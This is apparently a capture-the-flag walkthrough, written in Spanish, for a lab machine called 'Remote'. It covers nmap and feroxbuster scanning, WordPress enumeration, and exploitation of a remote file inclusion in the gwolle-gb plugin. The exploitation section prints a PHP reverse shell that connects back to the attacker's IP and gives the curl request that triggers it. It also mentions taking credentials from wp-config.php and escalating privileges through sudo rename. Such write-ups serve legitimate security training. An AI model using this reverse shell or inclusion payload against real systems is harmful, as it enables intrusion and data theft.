# Máquina Remote

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.155

![alt text](image-1.png)


### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.155

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.155/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

entré en la web:

![alt text](image-4.png)

hice ctrl + u 

![alt text](image-5.png)

lo agregué al /etc/hosts

ahora entro http://remote.nyx/wordpress/

![alt text](image-6.png)

Utilizo wpscan para ver usuarios y plugins:

wpscan --url http://remote.nyx/wordpress -e p,u --plugins-detection aggressive

![alt text](image-7.png)

### Explotación 

creamos una revshell llamado wp-load.php

<?php 
    system("bash -c 'bash -i >& /dev/tcp/192.168.42.133/443 0>&1'");
?>


levantamos un servidor web con python 

python3 -m http.server 80

nos ponemos en escucha con netcat

luego con curl enviamos el archivo 

curl "http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://IP-KALI/"


![alt text](image-8.png)

en el archivo wp-config.php y encontramos una contraseña:

![alt text](image-9.png)

cambio al usuario tiago con la contraseña encontrada

### Escalar privilegios

![alt text](image-10.png)

![alt text](image-11.png)

al ejecutar sudo -u root /usr/bin/rename -m nos aparece una ventana que le pondremos lo siguiente

![alt text](image-12.png)

y listo somos root

### user.txt

![alt text](image-13.png)

### root.txt

![alt text](image-14.png)